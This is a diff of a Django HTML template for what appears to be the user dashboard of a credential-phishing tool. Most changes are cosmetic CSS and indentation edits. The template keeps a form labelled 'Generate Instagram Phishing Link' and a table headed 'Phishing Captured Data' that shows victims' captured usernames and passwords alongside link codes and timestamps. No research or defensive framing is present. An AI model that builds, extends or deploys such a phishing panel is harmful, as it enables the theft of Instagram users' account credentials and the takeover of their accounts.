@@ -6,6 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
   <style>
     * {
       margin: 0;
@@ -25,7 +26,7 @@
 
     .wrapper {
       width: 100%;
-      max-width: 900px;
+      max-width: 1000px;
       background: #000;
       box-shadow: 0 0 50px #0ef;
       border-radius: 20px;
@@ -39,18 +40,20 @@
       }
     }
 
-    h1, h5, h6, p, label, th, td {
+    h1, h2, h3, h4, h5, h6, p, label, th, td {
       color: #fff;
     }
 
     .btn {
       display: inline-block;
-      padding: 10px 20px;
+      padding: 10px 25px;
       border: none;
       border-radius: 30px;
       cursor: pointer;
       font-weight: 600;
       transition: all 0.3s ease;
+      text-align: center;
+      text-decoration: none;
     }
 
     .btn-danger {
@@ -62,7 +65,7 @@
     .btn-warning {
       background: #0ef;
       color: #000;
-      box-shadow: 0 0 10px #0ef;
+      box-shadow: 0 0 15px #0ef;
     }
 
     .btn-warning:hover {
@@ -71,7 +74,7 @@
 
     input[type="email"] {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       background: transparent;
       border: 1px solid #0ef;
       color: #fff;
@@ -79,18 +82,18 @@
       outline: none;
     }
 
-    input[type="email"]::placeholder {
+    input::placeholder {
       color: #aaa;
     }
 
-    input[type="email"]:focus {
+    input:focus {
       box-shadow: 0 0 10px #0ef;
     }
 
     .row {
       display: flex;
       flex-wrap: wrap;
-      gap: 10px;
+      gap: 15px;
       margin-top: 15px;
     }
 
@@ -102,13 +105,14 @@
     table {
       width: 100%;
       border-collapse: collapse;
-      margin-top: 20px;
+      margin-top: 30px;
       color: #fff;
+      border: 1px solid #0ef;
     }
 
     th, td {
       border: 1px solid #0ef;
-      padding: 10px;
+      padding: 12px;
       text-align: center;
     }
 
@@ -117,14 +121,25 @@
       color: #000;
     }
 
+    hr {
+      margin: 25px 0;
+      border-color: #0ef;
+    }
+
+    .table-responsive {
+      overflow-x: auto;
+    }
+
     @media (max-width: 768px) {
       .wrapper {
         padding: 20px;
       }
+
       h1 {
         font-size: 24px;
         text-align: center;
       }
+
       th, td {
         font-size: 14px;
         padding: 8px;
@@ -135,6 +150,10 @@
       .row {
         flex-direction: column;
       }
+
+      .btn {
+        width: 100%;
+      }
     }
   </style>
 </head>
@@ -144,55 +163,55 @@
   <h1 class="text-center">User Home</h1>
 
   {% if data %}
-  {% for d in data %}
-  <div class="mb-4">
-    <h5>Welcome, {{ d.name }}</h5>
-    <p><strong>Email:</strong> {{ d.email }}</p>
-    <a href="../logout/" class="btn btn-danger mb-3">Logout</a>
+    {% for d in data %}
+      <div class="mb-4">
+        <h4>Welcome, {{ d.name }}</h4>
+        <p><strong>Email:</strong> {{ d.email }}</p>
+        <a href="../logout/" class="btn btn-danger mb-3">Logout</a>
 
-    <hr>
-    <h6 class="mb-2">Generate Instagram Phishing Link</h6>
-    <form method="post" action="../generate_link/">
-      {% csrf_token %}
-      <div class="row">
-        <div class="col">
-          <input type="email" name="email" value="{{ d.email }}" placeholder="Enter email" required>
-        </div>
-        <div class="col">
-          <button type="submit" class="btn btn-warning w-100">Generate Link</button>
-        </div>
+        <hr>
+
+        <h5>Generate Instagram Phishing Link</h5>
+        <form method="post" action="../generate_link/">
+          {% csrf_token %}
+          <div class="row">
+            <div class="col">
+              <input type="email" name="email" value="{{ d.email }}" placeholder="Enter email" required>
+            </div>
+            <div class="col">
+              <button type="submit" class="btn btn-warning w-100">Generate Link</button>
+            </div>
+          </div>
+        </form>
       </div>
-    </form>
-  </div>
 
-  {% if data1 %}
-  <div class="table-responsive">
-    <h5 class="mb-3">Phishing Captured Data</h5>
-    <table>
-      <thead>
-        <tr>
-          <th>Username</th>
-          <th>Password</th>
-          <th>Link Code</th>
-          <th>Time</th>
-        </tr>
-      </thead>
-      <tbody>
-        {% for item in data1 %}
-        <tr>
-          <td>{{ item.entered_username }}</td>
-          <td>{{ item.entered_password }}</td>
-          <td>{{ item.phishing_link.unique_code }}</td>
-          <td>{{ item.created_at }}</td>
-        </tr>
-        {% endfor %}
-      </tbody>
-    </table>
-  </div>
+      {% if data1 %}
+        <div class="table-responsive">
+          <h5 class="mt-4">Phishing Captured Data</h5>
+          <table>
+            <thead>
+              <tr>
+                <th>Username</th>
+                <th>Password</th>
+                <th>Link Code</th>
+                <th>Time</th>
+              </tr>
+            </thead>
+            <tbody>
+              {% for item in data1 %}
+                <tr>
+                  <td>{{ item.entered_username }}</td>
+                  <td>{{ item.entered_password }}</td>
+                  <td>{{ item.phishing_link.unique_code }}</td>
+                  <td>{{ item.created_at }}</td>
+                </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+        </div>
+      {% endif %}
+    {% endfor %}
   {% endif %}
-  {% endfor %}
-  {% endif %}
-
 </div>
 
 </body>
